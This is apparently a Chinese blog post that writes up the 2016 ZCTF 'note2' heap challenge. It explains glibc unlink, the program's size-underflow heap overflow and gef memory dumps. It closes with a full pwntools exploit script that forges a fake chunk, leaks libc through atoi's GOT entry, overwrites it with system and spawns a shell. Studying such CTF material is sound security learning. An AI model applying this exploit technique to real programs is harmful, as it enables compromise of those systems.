---
title: CTF | 2016 ZCTF note2
date: 2018-04-05 23:27:02
tags:
---
2016 ZCTF note2 writeup
关于 unlink 利用
<!-- more -->
### unlink
来复习一下 unlink。。
控制堆块的 fd,bk 指针
```
FD=P->fd 
BK=P->bk
FD->bk = BK
BK->fd = FD
```
64位：
```
fd = &P-0x18
bk = &P-0x10
效果： P = &P-0X18
```
32 位
```
fd = &p-12
bk = &p-8
效果: p =&p-12
```
可以好好看一下 unlink 宏
```c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");                              \
    FD = P->fd;                                                                      \
    BK = P->bk;                                                                      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr ("corrupted double-linked list");                              \
    else {                                                                      \
        FD->bk = BK;                                                              \
        BK->fd = FD;                                                              \
       ....
}
```
### 分析程序

首先，我们先分析一下程序，可以看出程序的主要功能为
#### add
size 限制为 `0x80`
#### show
输出 `note` 内容
#### edit
其中包括覆盖已有的 `note` ，在已有的 `note` 后面添加内容。
#### free 
释放 chunk

bss 段 ptr `0x00000602120` 管理 malloc chunk 的 ptr，是 ptr 的数组，我们的目的就是把 ptr 改为 ptr-12,然后可以修改 ptr[x] 的值什么的，然后往 `ptr[x]` 指向的地方写东西。 你想想 ptr[x] 改为 `free_hook` 或其他，再通过` edit x`，把内容改为 `system` 函数地址，不就利用啦
### 漏洞
1. 堆溢出  
在添加 note 时，需要设置 `note` 的 `size` ，但是读取的循环变量 i 是**无符号**变量，所以比较时都会转换为无符号变量，那么当我们输入 `size` 为 0 时，`size-1` 会变成一个很大的整数，glibc 根据其规定，会分配 0x20 个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。
ps:这个漏洞我自己是看不出的...
2. free 漏洞  
edit 函数,每次都会` malloc 0xa0`,但是 free 的时候没有把指针置为 NULL

### 利用
#### unlink
首先 `new` 三个 `chunk`: 大小分别为 `0x80,0,0x80。`
第二个 `chunk` 虽然申请的大小为0，但是glibc的要求 chunk 块至少可以存储4个必要的字段`(prev_size,size,fd,bk)`，所以会分配 `0x20` 的空间,又因为程序漏洞，所以可以读取任意长度的内容。。
```c
gef➤  x/16gx 0x0000000000602120
0x602120:	0x0000000000861010	0x00000000008610a0 => ptr[0] ptr[1]
0x602130:	0x00000000008610c0	0x0000000000000000 => ptr[2]
0x602140:	0x0000000000000080	0x0000000000000000
0x602150:	0x0000000000000080	0x0000000000000000
0x602160:	0x0000000000000003	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000006f6c6c6568	0x0000000000000000

gef➤  heap chunks
Chunk(addr=0x861010, size=0x90, flags=PREV_INUSE) => chunk 0
    [0x0000000000861010     61 61 61 61 61 61 61 61 61 00 00 00 00 00 00 00     aaaaaaaaa.......] 
Chunk(addr=0x8610a0, size=0x20, flags=PREV_INUSE) => chunk 1
    [0x00000000008610a0     61 61 61 61 61 61 61 61 00 00 00 00 00 00 00 00     aaaaaaaa........]
Chunk(addr=0x8610c0, size=0x90, flags=PREV_INUSE) => chunk 2
    [0x00000000008610c0     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62     bbbbbbbbbbbbbbbb]
```
堆块结构：
```c
gef➤  x/32gx 0x861010-0x10
0x861000:	0x0000000000000000	0x0000000000000091 => chunk 0 header 
0x861010:	0x6161616161616161	0x0000000000000061 => ptr[0] chunk 0 fake header1 
0x861020:	0x0000000000602108	0x0000000000602110 => fake fd, fake bk
0x861030:	0x6262626262626262	0x6262626262626262
0x861040:	0x6262626262626262	0x6262626262626262
0x861050:	0x6262626262626262	0x6262626262626262
0x861060:	0x6262626262626262	0x6262626262626262
0x861070:	0x0000000000000060	0x0000000000000000 => fake pre_size | fake ptr[0] chunk''s nextchunk
0x861080:	0x0000000000000000	0x0000000000000000
0x861090:	0x0000000000000000	0x0000000000000021 => chunk 1 header
0x8610a0:	0x6161616161616161	0x0000000000000000 => ptr[1]
0x8610b0:	0x0000000000000000	0x0000000000000091 => chunk 2 header
0x8610c0:	0x6262626262626262	0x6262626262626262 => ptr[2] 
0x8610d0:	0x0000000000000000	0x0000000000000000
0x8610e0:	0x0000000000000000	0x0000000000000000
0x8610f0:	0x0000000000000000	0x0000000000000000
```
其中构造了 `fake pre_size `是为了满足 `unlink` 中的检查

接下来
```
释放chunk1-覆盖chunk2-释放chunk2
deletenote(1)
content = 'a' * 16 + p64(0xa0) + p64(0x90)
newnote(0, content)
deletenote(2)
```
`free chunk 1`,大小为 `0x20`,会放到 `fastbin`，`newnote` 的时候为同一个，通过栈溢出可以修改 `chunk 2` `的pre_size` 和 `size` 分别为 `0xa0` 和 `0x90`。主要是设置了 `pre_size` 为 `0xa0`,并且 `inuse` 为 0，在进行 `unlink` 时根据 `pre_size` 得到后一个 `chunk`,刚好是我们在 `chunk 0` 中构造的 `fake chunk`。所以释放 `chunk2` 的时候可以后向合并（合并低地址），对 `chunk 0` 中虚拟构造的 `chunk` 进行 `unlink` 。 `unlink` 成功后，`ptr[0]`所存储的地址变为 `fakebk` ，即` ptr-0x18`。
可以看一下具体操作 
```c
  /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```
```c
gef➤  x/32gx 0xae6010-0x10
0xae6000:	0x0000000000000000	0x0000000000000091
0xae6010:	0x6161616161616161	0x0000000000000061
0xae6020:	0x0000000000602108	0x0000000000602110
0xae6030:	0x6262626262626262	0x6262626262626262
0xae6040:	0x6262626262626262	0x6262626262626262
0xae6050:	0x6262626262626262	0x6262626262626262
0xae6060:	0x6262626262626262	0x6262626262626262
0xae6070:	0x0000000000000060	0x0000000000000000
0xae6080:	0x0000000000000000	0x0000000000000000
0xae6090:	0x0000000000000000	0x0000000000000021
0xae60a0:	0x6161616161616161	0x6161616161616161 
0xae60b0:	0x00000000000000a0	0x0000000000000090 => chunk 2 header modified
0xae60c0:	0x6262626262626200	0x6262626262626262 => ptr[2]
0xae60d0:	0x0000000000000000	0x0000000000000000
0xae60e0:	0x0000000000000000	0x0000000000000000
0xae60f0:	0x0000000000000000	0x0000000000000000
```
unlink后的效果：
```c
gef➤  x/16gx 0x0000000000602120
0x602120:	0x0000000000602108	0x0000000000000000 => ptr[0] = ptr-0x18
0x602130:	0x0000000000000000	0x00000000008750a0
```

#### 泄露libc 地址
`edit note[0]`，即 `edit ptr[0]` 指向的地方,即 `ptr-0x18`,修改 `ptr[0]` 为 `atoi` 的 `got`,通过 `show` 得到 `atoi` 地址，计算得 `libc` 地址
```c
gef➤  x/16gx 0x0000000000602120
0x602120:	0x0000000000602088	0x0000000000000000 => ptr[0] = atoi@got.plt
0x602130:	0x0000000000000000	0x00000000023710a0
0x602140:	0x0000000000000080	0x0000000000000000
0x602150:	0x0000000000000000	0x0000000000000000
0x602160:	0x0000000000000004	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000006f6c6c6568	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
gef➤  x/16gx 0x0000000000602088
0x602088 <atoi@got.plt>:	0x00007fc6acaa3e80	0x00000000004008c6
0x602098:	0x0000000000000000	0x0000000000000000
0x6020a8:	0x0000000000000000	0x0000000000000000
gef➤  x/16gx 0x00007fc6acaa3e80
0x7fc6acaa3e80 <atoi>:	0x00000aba08ec8348	0x00004530e8f63100
```

接下来修改 `atoi` 的 `got` 为 `system` 函数的地址

```python
content = p64(system_addr)
editnote(0, 1, content)
```
```c
gef➤  x/8gx 0x0000000000602088
0x602088 <atoi@got.plt>:	0x00007f44aa9a1390	0x00000000004008c6
0x602098:	0x0000000000000000	0x0000000000000000
0x6020a8:	0x0000000000000000	0x0000000000000000
0x6020b8:	0x0000000000000000	0x00007f44aad21620
gef➤  x/8gx 0x00007f44aa9a1390
0x7f44aa9a1390 <__libc_system>:	0xfa86e90b74ff8548	0x0000441f0f66ffff
0x7f44aa9a13a0 <__libc_system+16>:	0x48001479b83d8d48	0xfffffa70e808ec83

```
#### getshell
发送 `'/bin/sh' `就可以成功 `getshell` 了  
最终 `payload`
```python
from pwn import *
p = process('./note2')
note2 = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'


def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)


def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))


def editnote(id, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)


def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))

def unlink():
	ptr = 0x0000000000602120
	fakefd = ptr - 0x18
	fakebk = ptr - 0x10
	content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
	#content = p64(fakefd) + p64(fakebk)
	newnote(128, content)
	# chunk1: a zero size chunk produce overwrite
	newnote(0, 'a' * 8)
	# chunk2: a chunk to be overwrited and freed
	newnote(0x80, 'b' * 16)
	deletenote(1)
	content = 'a' * 16 + p64(0xa0) + p64(0x90)
	newnote(0, content)
	deletenote(2)
def system():
	atoi_got = note2.got['atoi']
	content = 'a' * 0x18 + p64(atoi_got)
	editnote(0, 1, content)
	
	shownote(0)

	p.recvuntil('is ')
	atoi_addr = p.recvuntil('\n', drop=True)
	print atoi_addr
	atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
	print 'leak atoi addr: ' + hex(atoi_addr)

	# get system addr
	atoi_offest = libc.symbols['atoi']
	libcbase = atoi_addr - atoi_offest
	system_offest = libc.symbols['system']
	system_addr = libcbase + system_offest
	
	print 'leak system addr: ', hex(system_addr)
	content = p64(system_addr)
	editnote(0, 1, content)
	gdb.attach(p)
	p.recvuntil('option--->>')
	p.sendline('/bin/sh')
	p.interactive()

def main():
	p.recvuntil('name:')
	p.sendline('hello')
	p.recvuntil('address:')
	p.sendline('hello')
	unlink()
	system()
if __name__ == "__main__":
    main()

```

接下来 .. 再做一遍 freenote 吧，真的老是忘。还有各种坑要填

### 参考链接
https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/


